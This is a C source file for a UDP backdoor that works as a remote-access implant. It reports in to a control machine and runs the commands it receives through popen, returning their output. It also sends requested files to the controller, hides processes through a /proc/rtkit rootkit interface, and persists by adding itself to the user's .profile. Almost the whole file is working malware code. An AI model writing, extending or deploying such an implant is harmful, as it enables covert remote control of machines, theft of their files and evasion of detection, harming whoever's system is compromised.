#include <stdio.h>
#include <errno.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>

#define PORT    1235
#define LENGTH  1518
struct sockaddr_in control_add;
struct sockaddr_in remote_add;
int sockfd;
int run = 1;  // Control Send on-line message
int length = sizeof(struct sockaddr_in);
char datagram[LENGTH];

void printError(int sort, char *err) {
    switch (sort) {
        case 0:
            printf("\e[33mERR_bind:");break;
        case 1:
            printf("\e[33mERR_recvfrom:");break;
        case 2:
            printf("\e[33mERR_sendto:");break;
        case 3:
            printf("\e[33mERR_pthread:");break;
        default:
            printf("\e[33mERR:");break;
    }
    printf(" %s\n\e[0m", err);
}

void *start_routine(void *arg) {
    int z;
    while(1) {
        bzero(datagram, LENGTH);
        z = recvfrom(sockfd, datagram, LENGTH, 0, (struct sockaddr *)&control_add, &length);
        if (z == -1)
            printError(1, strerror(errno));
        else if (strcmp(datagram, "ok") == 0) {
            run = 0;
            pthread_exit(0);
        }
    }
}

void sendOnline() {
    int x;
    bzero(datagram, LENGTH);
    x = sendto(sockfd, "ok", 2, 0, (struct sockaddr *)&control_add, sizeof(control_add));
    if (x == -1)
        printError(2, strerror(errno));
}

void initRemote() {
    int pid = getpid();
    char command[256];
    FILE *fp;

    bzero(command, sizeof(command));
    strcpy(command, "[ -d $HOME/REMOTE ] || mkdir $HOME/REMOTE\n\
                     [ -d $HOME/REMOTE/remote ] || cp ./remote $HOME/REMOTE\n\
                     grep -q \"$HOME/REMOTE/remote&\" $HOME/.profile || echo \"\n$HOME/REMOTE/remote&\" >> $HOME/.profile");
    fp = popen(command, "r");
    pclose(fp);
    // Insmod the rootkit
    // bzero(command, sizeof(command));
    // strcpy(command, "");
    // fp = popen(command, "r");
    // pclose(fp);
    // Hidden process
    bzero(command, sizeof(command));
    sprintf(command, "echo -n hp%d > /proc/rtkit", pid);
    fp = popen(command, "r");
    pclose(fp);
}

int main(int argc, char const *argv[]) {
    int x, z, ret, filelen;
    char *control_ip = "127.0.0.1";
    char hidepid[8], command[256], path[128], filename[256];
    char eof[10] = "___EOF___\n";
    pthread_t thread;

    FILE *fp;  // It will open a stream for the output of command

    // Initialize the host machine
    // initRemote();

    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    bzero(&control_add, sizeof(control_add));
    control_add.sin_family = AF_INET;
    control_add.sin_port = htons(PORT);
    control_add.sin_addr.s_addr = inet_addr(control_ip);

    while(1) {
        // Send on-line message to the control machine
        while(run) {
            if (run == 1) {
                puts("Waiting for connection...");
                ret = pthread_create(&thread, NULL, (void*)start_routine, NULL);
                if (ret != 0)
                    printError(3, strerror(errno));
            }
            sendOnline();
            run = 2;
            sleep(1);
        }

        puts("Waiting for command...");
        bzero(datagram, LENGTH);

        // Here we are waiting for receiving command from the control machine
        z = recvfrom(sockfd, datagram, LENGTH, 0, (struct sockaddr *)&control_add, &length);
        if (z == -1)
            printError(1, strerror(errno));

        datagram[z] = 0;
        printf("Command:%s", datagram);

        bzero(command, sizeof(command));
        sscanf(datagram, "%[^ ]", command);
        // Use function chdir() to replacement command 'cd'
        if (strcmp(command, "cd") == 0) {
            sscanf(datagram, "%*3s%s", path);
            if (chdir(path) == -1) {
                printf("Chdir: %s\n", strerror(errno));
            }else
                fp = popen("pwd", "r");
            bzero(path, sizeof(path));
        }
        // Continue to send on-line message
        else if (strcmp(command, "quit\n") == 0) {
            run = 1;
            continue;
        }
        // Quit the remote
        else if (strcmp(command, "squit\n") == 0) {
            break;
        }
        // Hide process with given id
        else if (strcmp(command, "hide") == 0) {
            bzero(command, sizeof(command));
            sscanf(datagram, "%*5s%s", hidepid);
            sprintf(command, "echo -n hp%s > /proc/rtkit", hidepid);
            bzero(hidepid, sizeof(hidepid));
            fp = popen(command, "r");
        }
        // Show the nesting of sub-directories
        else if (strcmp(command, "tree") == 0) {
            bzero(command, sizeof(command));
            sscanf(datagram, "%*5s%s", path);
            sprintf(command, "cd %s\npwd\n\
                              ls -R | grep \":$\" | sed -e 's/:$//' -e 's/[^-][^\\/]*\\//--/g' -e 's/^/   /' -e 's/-/|/'\n\
                              [ `ls -F -1 | grep \"/\" | wc -l` = 0 ] && echo \"   -> no sub-directories\"", path);
            bzero(path, sizeof(path));
            command[strlen(command) - 1] = 0;
            fp = popen(command, "r");
        }
        // Transfer file to the control machine
        else if (strcmp(command, "tran") == 0) {
            sscanf(datagram, "%*5s%s", filename);
            fp = fopen(filename, "r");
            fseek(fp, 0, SEEK_END);
            filelen = ftell(fp);
            rewind(fp);
            while(1){
                bzero(datagram, LENGTH);
                fread(datagram, LENGTH, 1, fp);
                if (filelen >= LENGTH) {
                    x = sendto(sockfd, datagram, LENGTH, 0, (struct sockaddr *)&control_add, sizeof(struct sockaddr_in));
                    if (x == -1) {
                        printError(2, strerror(errno));
                        break;
                    }
                    filelen -= x;
                }else {
                    x = sendto(sockfd, datagram, filelen, 0, (struct sockaddr *)&control_add, sizeof(struct sockaddr_in));
                    if (x == -1) {
                        printError(2, strerror(errno));
                        break;
                    }
                    x = sendto(sockfd, eof, sizeof(eof), 0, (struct sockaddr *)&control_add, sizeof(struct sockaddr_in));
                    break;
                }
            }
            fclose(fp);
            continue;
        }else {
            datagram[strlen(datagram) - 1] = 0;
            strcat(datagram, " 2>&1\n");  // Redirect the output
            fp = popen(datagram, "r");  // Opening a stream by executing the command
        }
        bzero(datagram, sizeof(datagram));

        // Collecting the output and sending to the control machine
        while(fgets(datagram, sizeof(datagram)-1, fp) != NULL) {
            x = sendto(sockfd, datagram, strlen(datagram), 0, (struct sockaddr *)&control_add, sizeof(control_add));
            if (x == -1) {
                printError(2, strerror(errno));
                break;
            }
            bzero(datagram, sizeof(datagram));
        }
        // Marking the end of output of command
        strcpy(datagram, eof);
        x = sendto(sockfd, datagram, strlen(datagram), 0, (struct sockaddr *)&control_add, sizeof(control_add));
        if (x == -1)
            printError(2, strerror(errno));
        pclose(fp);
    }
    close(sockfd);
    return 0;
}